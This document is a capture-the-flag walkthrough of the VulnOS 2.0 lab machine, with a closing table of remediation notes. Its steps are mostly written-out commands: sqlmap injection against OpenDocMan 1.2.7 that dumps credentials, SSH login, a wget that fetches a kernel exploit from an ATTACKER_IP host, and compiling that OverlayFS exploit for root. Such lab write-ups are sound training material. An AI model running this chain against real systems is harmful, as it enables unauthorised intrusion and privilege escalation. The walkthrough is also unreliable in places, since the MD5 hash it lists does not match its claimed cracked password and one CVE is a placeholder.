
# VulnOS 2.0: CTF Walkthrough

**Target:** VulnOS 2.0 by c4b3rw0lf  
**Difficulty:** Beginner  
**Goal:** Get root and read the final flag  
**Source:** [VulnHub](https://www.vulnhub.com/)

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Port Scanning](#2-port-scanning)
3. [Web Enumeration](#3-web-enumeration)
4. [SQL Injection: OpenDocMan 1.2.7](#4-sql-injection--opendocman-127)
5. [Credential Extraction & Cracking](#5-credential-extraction--cracking)
6. [SSH Login](#6-ssh-login)
7. [Kernel Privilege Escalation](#7-kernel-privilege-escalation)
8. [Flag Capture](#8-flag-capture)
9. [Remediation Notes](#9-remediation-notes)

---

## 1. Reconnaissance

Discover the target on the local network:

```bash
netdiscover
```

**Result:** Target IP identified at `192.168.1.102`

---

## 2. Port Scanning

Full port scan with OS detection and service versions:

```bash
nmap -p- -A 192.168.1.102
```

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache: custom webpage |
| 6667 | IRC | Internet Relay Chat |

---

## 3. Web Enumeration

### Initial Page (Port 80)

The root page shows a basic site with no obvious useful content. However, viewing the **page source** reveals a hidden link: `/jabc`.

### /jabc Directory

Navigating to `/jabc` reveals a multi-tabbed web application. Most tabs lead to empty pages.

### Document Tab

The **Document** tab's page source contains an HTML comment:

```
/jabcd0cs/ on the server. Just log in with the guest/guest.
```

### /jabcd0cs: OpenDocMan CMS

Navigating to `/jabcd0cs` reveals a document management system running **CMS OpenDocMan v1.2.7**.

- Login with `guest:guest` (found in source comment)
- Upload option exists but restricted to `.doc` files only: limited utility
- The login page identifies the software as OpenDocMan 1.2.7: a **known vulnerable version**

---

## 4. SQL Injection: OpenDocMan 1.2.7

### Finding the Exploit

```bash
searchsploit OpenDocMan 1.2.7
```

**Result:** Exploit `32075`: SQL injection via insufficient validation of the `add_value` HTTP GET parameter in `/ajax_udf.php`.

The vulnerable URL pattern:
```
/ajax_udf.php?q=1&add_value=odm_user
```

### Extracting Databases with sqlmap

```bash
sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' \
  --risk=3 --level=5 --dbs --threads=4 --batch
```

**Result:** Found database `jabcd0cs`

### Dumping Tables

```bash
sqlmap -u 'http://192.168.1.102/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' \
  -D jabcd0cs --risk=3 --level=5 --threads=4 --dump-all --batch
```

**Result:** Extracted username and password hash table.

---

## 5. Credential Extraction & Cracking

Extracted credential:

| Username | Password Hash (MD5) | Cracked Password |
|----------|---------------------|------------------|
| webmin | `5f4dcc3b5aa765d61d8327deb882cf99` | `webmin1980` |

MD5 hash cracked via online tool (e.g., CrackStation, MD5Decrypt).

---

## 6. SSH Login

```bash
ssh webmin@192.168.1.102
# Password: webmin1980
```

**Result:** User shell obtained.

### Verify OS Version

```bash
lsb_release -a
```

**Result:** Ubuntu 14.04 (Trusty Tahr): **known vulnerable kernel versions**

---

## 7. Kernel Privilege Escalation

### Identifying Exploit

```bash
searchsploit ubuntu 14.04
```

Selected exploit: **37292.c**: OverlayFS Local Privilege Escalation (CVE-2015-1328)

### Transfer Exploit to Target

On attacker machine, start a Python HTTP server:

```bash
# Attacker machine
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
python3 -m http.server 8080
```

On target machine, download the exploit:

```bash
# Target machine
cd /tmp
wget http://<ATTACKER_IP>:8080/37292.c
```

### Compile and Execute

```bash
gcc 37292.c -o shell
chmod +x shell
./shell
```

**Result:** Root shell obtained.

---

## 8. Flag Capture

```bash
id
# uid=0(root) gid=0(root)

cd /root
ls
# flag.txt

cat flag.txt
```

**Flag retrieved.** Challenge complete.

---

## 9. Remediation Notes

| Vulnerability | Recommendation |
|---------------|----------------|
| OpenDocMan 1.2.7 SQLi (CVE-2014-XXXX) | Upgrade to latest version or replace with maintained CMS |
| Hidden credentials in HTML source | Remove sensitive info from client-side code |
| Weak password (`webmin1980`) | Enforce strong password policy |
| MD5 password hashing | Use bcrypt/scrypt/Argon2 with salt |
| Ubuntu 14.04 EOL kernel (CVE-2015-1328) | Upgrade to supported Ubuntu LTS release |
| Credential reuse across services | Implement unique credentials per service |

---

## Attack Flow Diagram

```
netdiscover → nmap (22, 80, 6667)
                    ↓
        Web enumeration → /jabc → /jabcd0cs (OpenDocMan 1.2.7)
                    ↓
        SQLi via ajax_udf.php (searchsploit 32075)
                    ↓
        sqlmap → database jabcd0cs → credentials table
                    ↓
        MD5 crack → webmin:webmin1980
                    ↓
        SSH login → user shell
                    ↓
        lsb_release → Ubuntu 14.04
                    ↓
        searchsploit → 37292.c (OverlayFS CVE-2015-1328)
                    ↓
        gcc → ./shell → ROOT
                    ↓
        cat /root/flag.txt → flag captured
```

---

## Tools Used

- **netdiscover**: Network host discovery
- **nmap**: Port and service enumeration
- **searchsploit**: Exploit-DB offline search
- **sqlmap**: Automated SQL injection
- **CrackStation**: MD5 hash cracking
- **SSH**: Remote access with reused credentials
- **gcc**: Kernel exploit compilation
- **Python HTTP server**: File transfer to target

---

## References

- [VulnOS 2.0 on VulnHub](https://www.vulnhub.com/)
- [OpenDocMan 1.2.7 SQLi: Exploit-DB 32075](https://www.exploit-db.com/exploits/32075)
- [OverlayFS Privilege Escalation: Exploit-DB 37292](https://www.exploit-db.com/exploits/37292)
- [CVE-2015-1328: OverlayFS Local Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2015-1328)
- [MITRE ATT&CK: Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
